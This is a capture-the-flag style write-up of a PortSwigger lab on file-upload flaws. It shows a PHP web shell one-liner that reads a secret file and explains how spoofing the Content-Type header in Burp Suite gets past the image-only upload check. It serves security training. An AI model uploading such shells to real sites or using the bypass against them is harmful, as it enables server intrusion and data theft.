# Lab Writeup: Web shell upload via Content-Type restriction bypass

URL: https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/exploiting-flawed-validation-of-file-uploads/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass#

## Description

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

1. Login using `wiener:peter`
2. Create the following php payload:

   ```php
   <?php echo file_get_contents('/home/carlos/secret') ?>
   ```

3. Upload the payload as avatar and you'll get the following error: `Sorry, file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.` From the error we know that the only allowed types to be uploaded are `image/jpeg` and `image/png`
4. Try that again but intercept using burp suite:

   ![shell-content-type-bypass](/assets/shell-content-type-bypass.png)

   From the above intercepted request, change the `Content-Type` to either `image/jpeg` or `image/png` and the file should be successfully uploaded

5. Open the uploaded "image" payload to new tab, you'll get the value `JB8CEpCpw7w3ntC4GxTuLJHbEsUVtYtT`
6. Submit the value and the lab should be solved:

   ![shell-content-type-bypass-1](/assets/shell-content-type-bypass-1.png)
